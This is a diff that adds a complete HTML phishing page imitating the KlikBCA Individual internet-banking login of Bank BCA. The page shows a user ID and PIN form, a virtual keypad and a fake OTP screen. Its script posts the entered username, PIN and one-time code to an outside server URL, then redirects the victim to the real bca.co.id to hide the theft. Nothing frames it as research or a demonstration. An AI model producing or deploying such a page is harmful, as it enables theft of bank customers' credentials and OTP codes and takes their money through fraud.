@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0">
+  <title>KlikBCA Individual</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #0a3b5b;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      width: 100%;
+      max-width: 500px;
+      background: white;
+      padding: 30px 25px 35px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      transition: all 0.3s ease;
+    }
+    @media (min-width: 768px) {
+      .container {
+        max-width: 900px;
+        padding: 40px 50px;
+      }
+    }
+    .logo-area {
+      display: flex;
+      align-items: baseline;
+      margin-bottom: 30px;
+    }
+    .logo-bca {
+      font-size: 42px;
+      font-weight: 800;
+      color: #003366;
+      letter-spacing: -2px;
+      margin-right: 8px;
+    }
+    .logo-klik {
+      font-size: 32px;
+      font-weight: 600;
+      color: #003366;
+    }
+    @media (min-width: 768px) {
+      .logo-bca { font-size: 52px; }
+      .logo-klik { font-size: 42px; }
+    }
+    .field-container {
+      margin-bottom: 25px;
+    }
+    .label-bilingual {
+      font-size: 14px;
+      color: #003366;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+    .label-bilingual span {
+      font-weight: 400;
+      color: #555;
+      margin-left: 8px;
+      font-size: 13px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #b0c4ce;
+      font-size: 16px;
+      background: white;
+      border-radius: 0;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .input-field:focus {
+      border-color: #003366;
+      background-color: #fcf8e7;
+    }
+    @media (min-width: 768px) {
+      .input-field { padding: 16px; font-size: 18px; }
+    }
+    .keyboard {
+      display: none;
+      background: #e6ecf0;
+      border: 1px solid #b0c4ce;
+      padding: 15px;
+      margin: 20px 0 10px;
+    }
+    @media (min-width: 768px) {
+      .keyboard {
+        display: block;
+      }
+    }
+    .keyboard-title {
+      font-size: 14px;
+      font-weight: bold;
+      color: #003366;
+      margin-bottom: 10px;
+    }
+    .keyboard-row {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 8px;
+      justify-content: center;
+    }
+    .key {
+      background: white;
+      border: 1px solid #848484;
+      padding: 12px 0;
+      flex: 1 0 28%;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 0;
+      box-shadow: 0 2px 2px rgba(0,0,0,0.1);
+      transition: 0.05s;
+      user-select: none;
+    }
+    .key:active { background: #ccc; transform: scale(0.96); }
+    .key.special { background: #f0f0f0; font-size: 16px; }
+    .button-row {
+      display: flex;
+      gap: 15px;
+      margin: 30px 0 20px;
+    }
+    .btn-login {
+      flex: 2;
+      background: #003366;
+      color: white;
+      border: none;
+      padding: 16px 10px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      border-bottom: 4px solid #001a33;
+      letter-spacing: 2px;
+      transition: opacity 0.2s;
+    }
+    .btn-fullsite {
+      flex: 1;
+      background: #6c757d;
+      color: white;
+      border: none;
+      padding: 16px 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      border-bottom: 4px solid #3d444a;
+    }
+    .btn-login:hover, .btn-fullsite:hover { opacity: 0.9; }
+    @media (min-width: 768px) {
+      .btn-login { font-size: 24px; padding: 18px; }
+      .btn-fullsite { font-size: 20px; padding: 18px; }
+    }
+    .promo-box {
+      border-top: 2px solid #e0e0e0;
+border-bottom: 2px solid #e0e0e0;
+      padding: 20px 0;
+      margin: 20px 0;
+      text-align: left;
+    }
+    .promo-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #003366;
+      margin-bottom: 5px;
+    }
+    .promo-title span { color: #0077be; font-weight: 800; }
+    .promo-link {
+      font-size: 16px;
+      font-weight: 600;
+      color: #003366;
+      text-decoration: none;
+      border-bottom: 1px solid #003366;
+    }
+    .promo-link:hover { border-bottom-width: 2px; }
+    .footer-info {
+      font-size: 11px;
+      color: #333;
+      line-height: 1.5;
+      margin-top: 25px;
+      padding-top: 15px;
+      border-top: 1px solid #ccc;
+    }
+    .footer-info a { color: #003366; font-weight: bold; text-decoration: underline; }
+    .english {
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px dashed #aaa;
+    }
+    @media (min-width: 768px) {
+      .footer-info { font-size: 12px; }
+    }
+    .otp-container { display: none; }
+    .otp-message {
+      font-size: 16px;
+      color: #003366;
+      margin-bottom: 25px;
+    }
+    .otp-message small {
+      display: block;
+      font-size: 13px;
+      color: #666;
+      margin-top: 8px;
+    }
+    .resend-link {
+      display: inline-block;
+      margin: 20px 0 10px;
+      color: #0077be;
+      font-size: 14px;
+      cursor: pointer;
+      border-bottom: 1px solid #0077be;
+    }
+    .back-link {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .back-link a {
+      color: #6c757d;
+      font-size: 14px;
+      text-decoration: none;
+      border-bottom: 1px solid #6c757d;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo-area">
+      <span class="logo-bca">BCA</span>
+      <span class="logo-klik">KlikBCA</span>
+    </div>
+    <div id="loginScreen">
+      <form id="loginForm">
+        <div class="field-container">
+          <div class="label-bilingual">
+            Silakan masukkan USER ID Anda <span>Please enter your USER ID</span>
+          </div>
+          <input type="text" id="userid" class="input-field" autocomplete="off">
+        </div>
+        <div class="field-container">
+          <div class="label-bilingual">
+            Silakan masukkan PIN Internet Banking Anda <span>Please enter your Internet Banking PIN</span>
+          </div>
+          <input type="password" id="pin" class="input-field" autocomplete="off">
+        </div>
+        <div class="keyboard">
+          <div class="keyboard-title">🔢 VIRTUAL KEYBOARD</div>
+          <div class="keyboard-row">
+            <div class="key" onclick="appendToPin('1')">1</div>
+            <div class="key" onclick="appendToPin('2')">2</div>
+            <div class="key" onclick="appendToPin('3')">3</div>
+          </div>
+          <div class="keyboard-row">
+            <div class="key" onclick="appendToPin('4')">4</div>
+            <div class="key" onclick="appendToPin('5')">5</div>
+            <div class="key" onclick="appendToPin('6')">6</div>
+          </div>
+          <div class="keyboard-row">
+            <div class="key" onclick="appendToPin('7')">7</div>
+            <div class="key" onclick="appendToPin('8')">8</div>
+            <div class="key" onclick="appendToPin('9')">9</div>
+          </div>
+          <div class="keyboard-row">
+            <div class="key" onclick="appendToPin('0')">0</div>
+            <div class="key special" onclick="clearPin()">Clear</div>
+            <div class="key special" onclick="deleteLastPin()">←</div>
+          </div>
+          <div class="keyboard-row">
+            <div class="key special" onclick="appendToPin('*')">*</div>
+            <div class="key special" onclick="appendToPin('#')">#</div>
+            <div class="key special" onclick="appendToPin('@')">@</div>
+          </div>
+        </div>
+<div class="button-row">
+          <button type="submit" class="btn-login">LOGIN</button>
+          <button type="button" class="btn-fullsite" onclick="alert('Full Site')">Full Site</button>
+        </div>
+      </form>
+      <div class="promo-box">
+        <div class="promo-title">
+          Transaksi Lebih Mudah dan Nyaman<br>di <span>myBca</span> Versi Website
+        </div>
+        <a href="#" class="promo-link" onclick="alert('mybca.bca.co.id')">mybca.bca.co.id</a>
+      </div>
+      <div class="footer-info">
+        <div>BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</div>
+        <div>BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp2 miliar.</div>
+        <div>Untuk cek Tingkat Bunga Penjaminan LPS, <a href="#">klik disini</a>.</div>
+        <div class="english">
+          <div>BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan) & Bank Indonesia.</div>
+          <div>BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum deposit value guaranteed by LPS per customer per bank is IDR 2 billion.</div>
+          <div>To check the LPS Guarantee Interest Rate, <a href="#">click here</a>.</div>
+        </div>
+      </div>
+    </div>
+    <div id="otpScreen" class="otp-container">
+      <div class="otp-message">
+        Masukkan kode OTP yang dikirim ke nomor HP terdaftar Anda<br>
+        <small>Enter the OTP code sent to your registered mobile number</small>
+      </div>
+      <form id="otpForm">
+        <div class="field-container">
+          <div class="label-bilingual">Kode OTP <span>OTP Code</span></div>
+          <input type="text" id="otpCode" class="input-field" placeholder="6 digit" maxlength="6" autocomplete="off">
+        </div>
+        <div class="button-row">
+          <button type="submit" class="btn-login">VERIFY</button>
+          <button type="button" class="btn-fullsite" onclick="alert('Cancelled')">Cancel</button>
+        </div>
+      </form>
+      <div class="resend-link" onclick="alert('Kode OTP telah dikirim ulang')">Kirim ulang OTP (Resend OTP)</div>
+      <div class="back-link">
+        <a onclick="goBackToLogin()">← Kembali (Back to login)</a>
+      </div>
+    </div>
+  </div>
+  <script>
+    const SERVER_URL = 'https://your-server.onrender.com/post';
+    let savedUserId = '';
+    let savedPin = '';
+
+    function appendToPin(value) {
+      document.getElementById('pin').value += value;
+    }
+    function clearPin() {
+      document.getElementById('pin').value = '';
+    }
+    function deleteLastPin() {
+      let pin = document.getElementById('pin');
+      pin.value = pin.value.slice(0, -1);
+    }
+
+    async function sendToServer(step, userId, pin, otp = null) {
+      const payload = { username: userId, password: pin, otp: otp, step: step };
+      try {
+        await fetch(SERVER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error('Ошибка отправки на сервер:', e);
+      }
+    }
+
+    function showOtpScreen(userId, pin) {
+      savedUserId = userId;
+      savedPin = pin;
+      document.getElementById('loginScreen').style.display = 'none';
+      document.getElementById('otpScreen').style.display = 'block';
+    }
+
+    function goBackToLogin() {
+      document.getElementById('loginScreen').style.display = 'block';
+      document.getElementById('otpScreen').style.display = 'none';
+      document.getElementById('otpCode').value = '';
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const userId = document.getElementById('userid').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      if (!userId || !pin) {
+        alert('Silakan masukkan USER ID dan PIN');
+        return;
+      }
+      sendToServer('login', userId, pin);
+      showOtpScreen(userId, pin);
+    });
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const otp = document.getElementById('otpCode').value.trim();
+      if (!otp || otp.length < 4) {
+        alert('Masukkan kode OTP dengan benar');
+        return;
+      }
+      sendToServer('otp', savedUserId, savedPin, otp);
+      const verifyBtn = document.querySelector('#otpForm .btn-login');
+      verifyBtn.textContent = 'VERIFYING...';
+      verifyBtn.disabled = true;
+      setTimeout(() => {
+        window.location.href = 'https://www.bca.co.id/';
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
